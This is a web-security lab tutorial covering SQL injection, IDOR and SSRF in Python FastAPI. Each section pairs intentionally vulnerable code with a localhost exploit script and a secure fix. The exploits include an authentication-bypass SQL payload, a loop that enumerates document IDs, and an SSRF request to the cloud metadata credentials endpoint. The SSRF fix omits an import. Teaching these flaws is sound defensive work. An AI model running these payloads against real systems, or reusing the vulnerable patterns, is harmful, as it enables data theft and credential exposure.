---
title: "Web Vulnerabilities Lab"
description: "query = f'SELECT * FROM users WHERE username = '{username}''"
keywords: ["AppSec", "Cybersecurity", "Security Guide", "Tutorial", "09 Hands On", "Ctf Challenges", "02 Web Vulnerabilities Lab.Md"]
---

# Web Vulnerabilities Lab

## 1. SQL Injection (SQLi)
### Vulnerable Code (Python FastAPI)
```python
@app.get("/users")
def get_user(username: str):
    # VULNERABLE: Direct string concatenation
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchall()
```

### Exploit Script (Python)
```python
import requests

url = "http://localhost:8000/users"
# Payload to bypass authentication and dump the users table
payload = {"username": "admin' OR '1'='1"}
response = requests.get(url, params=payload)
print(response.json())
```

### Secure Fix
```python
@app.get("/users")
def get_user(username: str):
    # SECURE: Parameterized query
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))
    return cursor.fetchall()
```

## 2. Insecure Direct Object Reference (IDOR)
### Vulnerable Code
```python
@app.get("/documents/{doc_id}")
def get_document(doc_id: int):
    # VULNERABLE: No authorization check to ensure the document belongs to the requesting user
    doc = db.query(Document).filter(Document.id == doc_id).first()
    return doc
```

### Exploit Script
```python
import requests

# Enumerating document IDs to access unauthorized data
for i in range(1, 10):
    url = f"http://localhost:8000/documents/{i}"
    response = requests.get(url)
    if response.status_code == 200:
        print(f"Found document {i}: {response.json()}")
```

### Secure Fix
```python
@app.get("/documents/{doc_id}")
def get_document(doc_id: int, current_user: User = Depends(get_current_user)):
    # SECURE: Check ownership
    doc = db.query(Document).filter(Document.id == doc_id, Document.owner_id == current_user.id).first()
    if not doc:
        raise HTTPException(status_code=404, detail="Not Found")
    return doc
```

## 3. Server-Side Request Forgery (SSRF)
### Vulnerable Code
```python
import requests

@app.post("/fetch-image")
def fetch_image(url: str):
    # VULNERABLE: Fetches user-supplied URL without validation
    resp = requests.get(url)
    return {"content": resp.text}
```

### Exploit Script
```python
import requests

url = "http://localhost:8000/fetch-image"
# Payload targeting internal cloud metadata service
payload = {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
response = requests.post(url, json=payload)
print(response.json())
```

### Secure Fix
```python
import ipaddress
import urllib.parse
import requests
from fastapi import HTTPException

def is_safe_url(url: str):
    parsed = urllib.parse.urlparse(url)
    ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
    if ip.is_private or ip.is_loopback:
        return False
    return True

@app.post("/fetch-image")
def fetch_image(url: str):
    if not is_safe_url(url):
        raise HTTPException(status_code=400, detail="Invalid URL")
    resp = requests.get(url)
    return {"content": resp.text}
```
